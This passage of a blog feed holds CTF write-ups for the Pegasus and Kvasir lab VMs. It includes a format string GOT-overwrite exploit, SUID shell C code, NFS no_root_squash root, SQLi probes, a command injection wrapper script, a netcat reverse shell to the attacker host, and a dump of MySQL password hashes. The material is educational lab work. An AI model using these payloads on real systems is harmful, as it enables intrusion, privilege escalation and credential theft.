Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.

# set a break point as we enter main()
(gdb) b main
Breakpoint 1 at 0x804850f

# run the binary
(gdb) r
Starting program: /home/mike/my_first

Breakpoint 1, 0x0804850f in main ()

# leak the current address of system()
(gdb) p system
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x40069060 &amp;lt;system&amp;gt;
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And so we learn that &lt;code&gt;system()&lt;/code&gt; lives at &lt;code&gt;0x40069060&lt;/code&gt;. What does this all mean so far then? Well, we are now going to use the format string vulnerability to write (using &lt;code&gt;%n&lt;/code&gt;) a new address for &lt;code&gt;printf()&lt;/code&gt; in the GOT at &lt;code&gt;08049bfc&lt;/code&gt; to point to &lt;code&gt;system()&lt;/code&gt; at &lt;code&gt;0x40069060&lt;/code&gt; instead of its real location.&lt;/p&gt;

&lt;p&gt;For us to debug the application while we prepare the required padding for the format string, we will use the &lt;code&gt;printf()&lt;/code&gt; used to pipe to &lt;code&gt;./my_first&lt;/code&gt; to redirect to a file instead. Then, in &lt;code&gt;gdb&lt;/code&gt;, we will run the binary, redirecting the input from the file we will compile with the &lt;code&gt;printf()&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# so, instead of the 4 x A&#39;s, we will now place the address
# in the GOT that we want to override, and use the %x format
# string to attempt writing to it
mike@pegasus:~$ printf &#39;1\n1\n\xfc\x9b\x04\x08%%8$n&#39; &amp;gt; t
mike@pegasus:~$ file t
t: data

# then, in gdb, we will grab the output of the new file called
# t, and redirect it as input to my_first
mike@pegasus:~$ gdb -q ./my_first
Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.

# leak the current address that GOT points to for printf()
(gdb) x/x 0x08049bfc
0x8049bfc &amp;lt;printf@got.plt&amp;gt;: 0x080483b6

# run the binary with our exploit (t) as input
(gdb) r &amp;lt; t
Starting program: /home/mike/my_first &amp;lt; t
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: ��

Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()

# inspect the new address the GOT points to for printf()
(gdb) x/x 0x08049bfc
0x8049bfc &amp;lt;printf@got.plt&amp;gt;: 0x00000004
(gdb)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is working exactly as expected. Now all that is left is to pad the format string so that we can have the address &lt;code&gt;0x40069060&lt;/code&gt; instead of &lt;code&gt;0x00000004&lt;/code&gt; written. For the math etc involved, refer to the Xerxes2 post I previously mentioned. The resultant format string was &lt;code&gt;\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&lt;/code&gt;, with a run in the debugger ending in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# prep the input file
mike@pegasus:~$ printf &#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39; &amp;gt; t
mike@pegasus:~$

# run it in the debugger
(gdb) r &amp;lt;t
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/mike/my_first &amp;lt;t
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: ����

[... snip ...]

sh: 1: Selection:: not found

Program received signal SIGSEGV, Segmentation fault.
0x08c3f98c in ?? ()

# check where the GOT points to for printf()
(gdb) x/x 0x08049bfc
0x8049bfc &amp;lt;printf@got.plt&amp;gt;: 0x40069060

# confirm system() is still there :)
(gdb) p system
$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x40069060 &amp;lt;system&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The binary crashes with &lt;code&gt;sh: 1: Selection:: not found&lt;/code&gt;, meaning that it is now trying to run &lt;code&gt;system(&amp;quot;Selection:&amp;quot;)&lt;/code&gt; instead of &lt;code&gt;printf(&amp;quot;Selection:&amp;quot;)&lt;/code&gt; due to the GOT override.&lt;/p&gt;

&lt;h4 id=&#34;finishing-the-exploit&#34;&gt;finishing the exploit&lt;/h4&gt;

&lt;p&gt;From here the exploit is pretty easy. We can use some $PATH trickery in our current shell to get &lt;code&gt;Selection:&lt;/code&gt; to actually mean something, like prepare a small SUID C shell perhaps? :)&lt;/p&gt;

&lt;p&gt;I quickly compiled some C wrapper code to prepare a shell and ran the exploit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Prep Selection: to make a SUID shell for john
# and modify PATH
mike@pegasus:~$ cat tojohn.c
#include &amp;lt;stdio.h&amp;gt;
int main()
{
    system(&amp;quot;cp /bin/sh /tmp/tojohn&amp;quot;);
    system(&amp;quot;chmod 4777 /tmp/tojohn&amp;quot;);
}
mike@pegasus:~$ gcc tojohn.c -o &amp;quot;Selection:&amp;quot;
mike@pegasus:~$ export PATH=/home/mike/:$PATH

# run the exploit...
mike@pegasus:~$ printf &#39;1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n&#39; | ./my_first
WELCOME TO MY FIRST TEST PROGRAM
--------------------------------
Select your tool:
[1] Calculator
[2] String replay
[3] String reverse
[4] Exit

Selection:
Enter first number: Enter second number: Error details: ����

                     10
Segmentation fault (core dumped)

# ... and check /tmp
mike@pegasus:~$ ls -lah /tmp/
total 108K
drwxrwxrwt  2 root root 4.0K Dec 23 23:17 .
drwxr-xr-x 22 root root 4.0K Nov 19 02:58 ..
-rwsrwxrwx  1 john mike  98K Dec 23 23:17 tojohn
mike@pegasus:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have a new file &lt;code&gt;tojohn&lt;/code&gt; in &lt;code&gt;/tmp&lt;/code&gt; :D&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mike@pegasus:~$ /tmp/tojohn
$ id
uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;hoofing-rooting-pegasus&#34;&gt;hoofing (rooting) Pegasus&lt;/h2&gt;

&lt;p&gt;I added the public key of the keypair I generated for Pegasus to &lt;code&gt;john&lt;/code&gt;&amp;rsquo;s authorized_keys file and proceeded to SSH in as him.&lt;/p&gt;

&lt;p&gt;Quick enumeration showed that &lt;code&gt;mike&lt;/code&gt; is allowed to start the nfs daemon via &lt;code&gt;sudo&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;john@pegasus:~$ sudo -l
Matching Defaults entries for john on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on this host:
    (root) NOPASSWD: /usr/local/sbin/nfs
john@pegasus:~$ sudo nfs
Usage: nfs [start|stop]
john@pegasus:~$ sudo nfs start
 * Exporting directories for NFS kernel daemon...                                                                                                                                 [ OK ]
 * Starting NFS kernel daemon                                                                                                                                                     [ OK ]
john@pegasus:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I checked out the &lt;code&gt;/etc/exports&lt;/code&gt; file, and noticed the the &lt;code&gt;no_root_squash&lt;/code&gt; flag for the &lt;code&gt;/opt/nfs&lt;/code&gt; export. This is most certainly the way to root Pegasus as nfs will not go and nobody my files :)&lt;/p&gt;

&lt;p&gt;So, I mounted the share&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# mkdir nfs
root@kali:~# mount 192.168.56.101:/opt/nfs nfs
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; prepped a SUID shell &amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/pegasus/nfs# cat shell.c
#include &amp;lt;stdio.h&amp;gt;

int main()
{
    setuid(0);
    setgid(0);
    system(&amp;quot;/bin/sh&amp;quot;);
}
root@kali:~/Desktop/pegasus/nfs# gcc shell.c -o shell
root@kali:~/Desktop/pegasus/nfs# chmod 4777 shell
root@kali:~/Desktop/pegasus/nfs# ls -lah
total 20K
drwxr-xr-x 2 root root 4.0K Dec 23 14:39 .
drwxr-xr-x 3 root root 4.0K Dec 23 14:32 ..
-rwsrwxrwx 1 root root 5.0K Dec 23 14:39 shell
-rw-r--r-- 1 root root   79 Dec 23 14:39 shell.c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; and rooted Pegasus :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;john@pegasus:~$ /opt/nfs/shell
# id
uid=0(root) gid=0(root) groups=0(root),1000(john)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;flag&#34;&gt;flag :)&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;# cat /root/flag
               ,
               |`\
              /&#39;_/_
            ,&#39;_/\_/\_                       ,
          ,&#39;_/\&#39;_\_,/_                    ,&#39;|
        ,&#39;_/\_&#39;_ \_ \_/                _,-&#39;_/
      ,&#39;_/&#39;\_&#39;_ \_ \&#39;_,\           _,-&#39;_,-/ \,      Pegasus is one of the best
    ,&#39; /_\ _&#39;_ \_ \&#39;_,/       __,-&#39;&amp;lt;_,&#39; _,\_,/      known creatures in Greek
   ( (&#39; )\/(_ \_ \&#39;_,\   __--&#39; _,-_/_,-&#39;,_/ _\      mythology. He is a winged
    \_`\&amp;gt; 6` 7  \&#39;_,/ ,-&#39; _,-,&#39;\,_&#39;_ \,_/&#39;_,\       stallion usually depicted
     \/-  _/ 7 &#39;/ _,&#39; _/&#39;\_  \,_&#39;_ \_ \&#39;_,/         as pure white in color.
      \_&#39;/&amp;gt;   7&#39;_/&#39; _/&#39; \_ &#39;\,_&#39;_ \_ \&#39;_,\          Symbol of wisdom and fame.
        &amp;gt;/  _ ,V  ,&amp;lt;  \__ &#39;\,_&#39;_ \_ \&#39;_,/
      /&#39;_  ( )_)\/-,&#39;,__ &#39;\,_&#39;_,\_,\&#39;_\             Fun fact: Pegasus was also
     ( ) \_ \|_  `\_    \_,/&#39;\,_&#39;_,/&#39;               a video game system sold in
      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.
       \_)   &amp;gt;        `\_                           It was a hardware clone of
            /  `,      |`\_                         the Nintendo Famicom.
           /    \     / \ `\
          /   __/|   /  /  `\
         (`  (   (` (_  \   /
         /  ,/    |  /  /   \
        / ,/      | /   \   `\_
      _/_/        |/    /__/,_/
     /_(         /_(


CONGRATULATIONS! You made it :)

Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you
learnt a thing or two while doing it! :)

Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and
providing first review.

Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode
and leave some feedback, I would love to hear from you!

Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
more awesome boot2root VMs!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for the fun &lt;a href=&#34;https://twitter.com/theknapsy&#34;&gt;@TheKnapsy&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>solving kvasir netcat edition</title>
      <link>https://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/</link>
      <pubDate>Sun, 09 Nov 2014 10:27:09 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;http://vulnhub.com/entry/kvasir-i,106/&#34;&gt;Kvasir&lt;/a&gt;, a boot2root by &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; has to be one of my most favorite boot2roots to date, if not the most favorite. Favorite however does not mean it was easy. It also proved to be one of the most challenging ones I have had the chance to try!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/netcat.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Kvasir is &lt;em&gt;extremely&lt;/em&gt; well polished, and it can be seen throughout the VM that &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; has gone through a lot of effort to make every challenge as rewarding as possible. From exploiting simple web based vulnerabilities to service misconfigurations, traffic sniffing, steganography, forensics and cryptopraphy, Kvasir has it all! Solving it also had me make really heavy use of good old netcat.&lt;/p&gt;

&lt;p&gt;This writeup details the path I took to read the final flag :)&lt;/p&gt;

&lt;h2 id=&#34;a-usual-start&#34;&gt;a usual start&lt;/h2&gt;

&lt;p&gt;Before we start off though, I feel its important to touch base on tunneling techniques used. All of the tunneling was done either via netcat, or via a SSH socks proxy. The socks proxies were accessed using &lt;code&gt;proxychains&lt;/code&gt;, and I was editing &lt;code&gt;/etc/proxychains.conf&lt;/code&gt; to match the port of the proxy I needed to use to reach my desired destination.&lt;/p&gt;

&lt;p&gt;With that out the way, lets start.
Almost all of the boot2roots have a discovery phase. After downloading the archive from &lt;a href=&#34;http://vulnhub.com&#34;&gt;vulnhub.com&lt;/a&gt;, I ran a ping scan in the subnet that my host-only network lives in. It returned with no results, and I realized there may already be more to this than anticipated. I engaged *lazy mode*™ and checked what the VirtualBox session showed the IP was:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_ip.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;strong&gt;192.168.56.102&lt;/strong&gt;. Sweet, throwing &lt;code&gt;nmap&lt;/code&gt; at it showed only &lt;code&gt;tcp/80&lt;/code&gt; as open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.102

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 11:07 SAST
Nmap scan report for 192.168.56.102
Host is up (0.000061s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:CF:5D:57 (Cadmus Computer Systems)

Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;fink-ur-gud-enuf&#34;&gt;fink ur gud enuf?&lt;/h2&gt;

&lt;p&gt;Browsing to the IP using Iceweasel, we see a login portal presented to us:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_web.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I made a few attempts at guessing a login, and eventually just threw a &lt;code&gt;&#39;&lt;/code&gt; at the username field:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_web_sqli.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I had a instant troll alert and figured it can&amp;rsquo;t be &lt;em&gt;that&lt;/em&gt; easy!? Changing the username payload from &lt;code&gt;&#39;&lt;/code&gt; to &lt;code&gt;&#39; OR 1=1 LIMIT 1--&lt;/code&gt; with a random word as a password, resulted in the application returning a &lt;code&gt;403&lt;/code&gt; type response. I figured that something strange was going on here, and fired up &lt;a href=&#34;http://portswigger.net/burp/&#34;&gt;Burp Suite&lt;/a&gt; to have a look under the hood at what is happening. As seen in the web browser, the web server really does respond with a HTTP 403:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_login_403.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Moving on to the register page. Registration required a username and password, as well as a date of birth. I registered &lt;code&gt;bob:bob&lt;/code&gt; with a DoB of &lt;code&gt;09/09/09&lt;/code&gt;, and attempted to login with the credentials:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_member.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Not a very useful web application so far, but nonetheless, I figured there is something I am not seeing yet. I went back to the registration page and attempted some SQLi payloads there. The form definitely seemed vulnerable to SQLi, and I managed to uncover a part of the backend query as &lt;code&gt;&#39;a&#39;, &#39;a&#39;, 0, NULL)&lt;/code&gt;. Considering this was a new account registration page, my guess was that this was part of a &lt;code&gt;INSERT&lt;/code&gt; query:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_submit_sqli.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;It was about at this time where that thing called real life started to interfere and drive my attention away from Kvasir. While working, I decided to run trusty &amp;lsquo;ol &lt;code&gt;wfuzz&lt;/code&gt; on the web service to see if there was anything interesting to reveal:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.102/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.102/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt

Total requests: 1660
==================================================================
ID  Response   Lines      Word         Chars          Request
==================================================================

00077:  C=302     16 L        34 W      365 Ch    &amp;quot; - admin&amp;quot;
00302:  C=403     10 L        30 W      294 Ch    &amp;quot; - cgi-bin/&amp;quot;
00394:  C=403     10 L        30 W      292 Ch    &amp;quot; - create&amp;quot;
00455:  C=403     10 L        30 W      294 Ch    &amp;quot; - descarga&amp;quot;
00457:  C=403     10 L        30 W      296 Ch    &amp;quot; - descarrega&amp;quot;
00463:  C=403     10 L        30 W      298 Ch    &amp;quot; - descarregues&amp;quot;
00741:  C=200     20 L        44 W      464 Ch    &amp;quot; - index&amp;quot;
00894:  C=403     10 L        30 W      290 Ch    &amp;quot; - load&amp;quot;
00901:  C=302      0 L         0 W        0 Ch    &amp;quot; - login&amp;quot;
00904:  C=302      0 L         0 W        0 Ch    &amp;quot; - logout&amp;quot;
00964:  C=302     15 L        16 W      168 Ch    &amp;quot; - member&amp;quot;
01247:  C=200     17 L        39 W      426 Ch    &amp;quot; - register&amp;quot;
01331:  C=403     10 L        30 W      292 Ch    &amp;quot; - select&amp;quot;
01432:  C=200      0 L         0 W        0 Ch    &amp;quot; - submit&amp;quot;
01556:  C=403     10 L        30 W      292 Ch    &amp;quot; - update&amp;quot;
01565:  C=403     10 L        30 W      293 Ch    &amp;quot; - updates&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Woa, thats quite a bit of results to work through eh :)&lt;/p&gt;

&lt;h2 id=&#34;admins-only-want-to-302-here&#34;&gt;admins only want to 302 here&lt;/h2&gt;

&lt;p&gt;Of everything &lt;code&gt;wfuzz&lt;/code&gt; revealed to us, &lt;code&gt;admin.php&lt;/code&gt; was the most interesting one. Watching Burp as the requests went up and down, I noticed that &lt;code&gt;admin.php&lt;/code&gt; would return a HTTP 302 code with a location, along with an actual body:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_admin_php.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Sweet! I modified the response in Burp to return &lt;code&gt;200&lt;/code&gt; instead, and removed the &lt;code&gt;Location:&lt;/code&gt; header. We now had a new page to work with :)&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_admin_bypass.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The form hints that we can check the service status of daemons running on the underlying OS, and suggests &lt;code&gt;apache2&lt;/code&gt; as input. I submitted the form with &lt;code&gt;apache2&lt;/code&gt; as the service, and got back a response (that also tried to 302 but I fixed that :D) with a new section &lt;code&gt;Apache2 is running (pid 1330).&lt;/code&gt;. This just &lt;strong&gt;screams&lt;/strong&gt; command injection doesn’t it?&lt;/p&gt;

&lt;h2 id=&#34;command-injection&#34;&gt;command injection&lt;/h2&gt;

&lt;p&gt;In order for me to fuzz this further, I took the request to trusty &amp;lsquo;ol &lt;code&gt;curl&lt;/code&gt;. While doing this, I realized that &lt;code&gt;admin.php&lt;/code&gt; did no checks to ensure that we are authenticated or anything. We could simply submit &lt;code&gt;service=&amp;lt;payload&amp;gt;&lt;/code&gt; as a POST to &lt;code&gt;admin.php&lt;/code&gt; and get output:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl &#39;http://192.168.56.102/admin.php&#39; --data &#39;service=apache2;&#39;

&amp;lt;html&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;div align=&amp;quot;center&amp;quot;&amp;gt;

&amp;lt;h1&amp;gt;Service Check&amp;lt;/h1&amp;gt;

&amp;lt;form name=&amp;quot;service&amp;quot; method=&amp;quot;post&amp;quot; action=&amp;quot;&amp;quot;&amp;gt;
&amp;lt;input name=&amp;quot;service&amp;quot; id=&amp;quot;service&amp;quot; type=&amp;quot;text&amp;quot; placeholder=&amp;quot;apache2&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;
&amp;lt;input name=&amp;quot;submit&amp;quot; id=&amp;quot;submit&amp;quot; type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit&amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;form action=&amp;quot;logout.php&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Logout&amp;quot; /&amp;gt;
&amp;lt;/form&amp;gt;

&amp;lt;pre&amp;gt;Usage: /etc/init.d/apache2 {start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean|status}.
&amp;lt;/pre&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entering &lt;code&gt;apache2;&lt;/code&gt; as the input, revealed the first step in our command injection. With &lt;code&gt;apache2;&lt;/code&gt; as the payload, I figured that the php script was taking our user input and running with the following pseudo code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

print system(&amp;quot;/etc/init.d/&amp;quot; . $_POST[&amp;quot;service&amp;quot;] . &amp;quot; status&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, with our payload, we have modified this to run &lt;code&gt;/etc/init.d/apache2; status&lt;/code&gt;, which will fail for obvious reasons! A little more fiddling finally got me to a working payload by posting &lt;code&gt;service=&lt;/code&gt; as &lt;code&gt;;echo &#39;id&#39;;&lt;/code&gt; where the single quotes are actually back ticks. (octopress grrr)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl &#39;http://192.168.56.102/admin.php&#39; --data &#39;service=;echo `id`;&#39;

[... snip ...]

&amp;lt;pre&amp;gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
&amp;lt;/pre&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;netcat-is-our-entry-into-the-rabbit-hole&#34;&gt;netcat is our entry into the rabbit hole&lt;/h2&gt;

&lt;p&gt;With the command injection now exploitable, I grabbed some skeleton code that I normally use to try and make these types of command execution vulnerabilities slightly easier to work with. The basic premise is to have the command executed, and the response regex&amp;rsquo;d out. This ended up as the following python script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Kvasir Command Execution

# $ python cmd.py &amp;quot;uname -a&amp;quot;
# Command to run: uname -a
#
# Linux web 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64 GNU/Linux

import requests
import re
import sys
import os
import binascii

print &#39;Command to run: %s&#39; % sys.argv[1]

# generate 2 random strings so that we can regex out the command output
command_start = binascii.b2a_hex(os.urandom(30))
command_end = binascii.b2a_hex(os.urandom(30))

# prepare something that we can regex out
params = {&#39;service&#39; : &#39;;echo %s; echo `%s`; echo %s;&#39; % (command_start, sys.argv[1], command_end) }

#fetch, ignoring the troll redirect
r = requests.post(&#39;http://192.168.56.102/admin.php&#39;, params, allow_redirects=False)

#match regex and print
print  re.findall(r&#39;%s([^|]+)%s&#39; % (command_start, command_end), r.text)[0].replace(&#39;\n%s\n&#39; % command_end,&#39;&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, now I can just run &lt;code&gt;python cmd.py &amp;quot;id&amp;quot;&lt;/code&gt; and get the output (the &lt;em&gt;(kvasir)&lt;/em&gt; in front of my prompt is my python virtualenv where I installed the &lt;code&gt;requests&lt;/code&gt; dependency):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# python cmd.py &amp;quot;id&amp;quot;
Command to run: id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And so, initial enumeration was done. Immediately I noticed that this host had 2 network interfaces. &lt;strong&gt;192.168.1.100&lt;/strong&gt; and &lt;strong&gt;192.168.2.100&lt;/strong&gt;. No sign of &lt;strong&gt;192.168.56.102&lt;/strong&gt; here&amp;hellip; It also seemed like I would be able to build a netcat shell out of this environment to my attacking host, so I set up a listener with &lt;code&gt;nc -lvp 4444&lt;/code&gt;, and connected to it using my &lt;code&gt;cmd.py&lt;/code&gt; script &lt;code&gt;python cmd.py &amp;quot;/bin/nc 192.168.56.101 4444 -e /bin/bash&amp;quot;&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53516
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, in order to make sure we don&amp;rsquo;t lose our place, consider the following simple diagram showing the network paths for gaining first shell access to the host &lt;code&gt;web&lt;/code&gt;:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The only public presence of the internal network is therefore the originally discovered &lt;strong&gt;192.168.56.102&lt;/strong&gt; IP address.&lt;/p&gt;

&lt;h2 id=&#34;my-see-qual-as-root-deserves-a-slap-on-the-wrist&#34;&gt;my-see-qual as root deserves a slap on the wrist&lt;/h2&gt;

&lt;p&gt;With semi interactive shell access using &lt;code&gt;netcat&lt;/code&gt; to &lt;strong&gt;web&lt;/strong&gt; (192.168.1.100), some more enumeration was done. Most importantly, the sources serving the web site that I have exploited to gain a command shell revealed credentials and a host of a MySQL instance. Consider the following extract from &lt;code&gt;member.php&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

session_start();

if (!isset($_SESSION[&amp;quot;member&amp;quot;])) {
    header(&amp;quot;Location: index.php&amp;quot;);
}

$user = $_SESSION[&amp;quot;username&amp;quot;];

mysql_connect(&amp;quot;192.168.2.200&amp;quot;, &amp;quot;webapp&amp;quot;, &amp;quot;webapp&amp;quot;) or die(mysql_error());
mysql_select_db(&amp;quot;webapp&amp;quot;) or die(mysql_error());

$query = &amp;quot;SELECT dob FROM users WHERE username=&#39;$user&#39;&amp;quot;;
$result = mysql_query($query) or die(mysql_error());

?&amp;gt;
[... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So mysql access with &lt;code&gt;webapp:webapp&lt;/code&gt; at 192.168.2.200. Lets test this and check out the server. I executed commands using mysql -e on the netcat shell that just spawned:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;show grants;&#39;
Grants for webapp@192.168.2.100
GRANT SELECT, INSERT ON *.* TO &#39;webapp&#39;@&#39;192.168.2.100&#39; IDENTIFIED BY PASSWORD &#39;*BF7C27E734F86F28A9386E9759D238AFB863BDE3&#39;
GRANT ALL PRIVILEGES ON `webapp`.* TO &#39;webapp&#39;@&#39;192.168.2.100&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So I can select anywhere. Nice :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;use webapp; show tables;&#39;
Tables_in_webapp
todo
users
mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;use webapp; select * from todo;&#39;
task
stop running mysql as root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A table called &lt;code&gt;todo&lt;/code&gt; exists, with a string &lt;code&gt;stop running mysql as root&lt;/code&gt;. That was the first hint and immediately had me thinking about &lt;a href=&#34;http://www.mysqludf.org/&#34;&gt;MySQL UDF&lt;/a&gt;&amp;rsquo;s, one which could allow us to run system commands. However, in order to get a UDF loaded, I will need a dba level account, one which I don&amp;rsquo;t have yet. From the previous grants output, I can see that I am allowed to query any table on the database server, so lets get some administrative hashes:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;use mysql; select DISTINCT User,Password from user;&#39;
User    Password
root    *ECB01D78C2FBEE997EDA584C647183FD99C115FD
debian-sys-maint    *E0E0871376896664A590151D348CCE9AA800435B
